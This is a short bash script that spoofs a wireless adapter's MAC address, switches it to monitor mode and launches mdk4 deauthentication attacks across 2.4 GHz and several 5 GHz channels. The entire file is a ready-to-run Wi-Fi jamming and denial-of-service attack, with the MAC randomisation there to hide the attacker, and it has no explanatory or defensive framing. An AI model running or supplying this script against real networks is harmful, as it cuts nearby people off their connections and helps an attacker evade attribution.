#!/bin/bash
sudo ip link set wlx24050fd8e739 down
sudo macchanger -r wlx24050fd8e739
sudo ip link set wlx24050fd8e739 up
sudo airmon-ng start wlx24050fd8e739
sudo mdk4 wlan0mon d -c h -x
sudo mdk4 wlan0mon d -c 36,40,44,48,149,153,157,161 -x
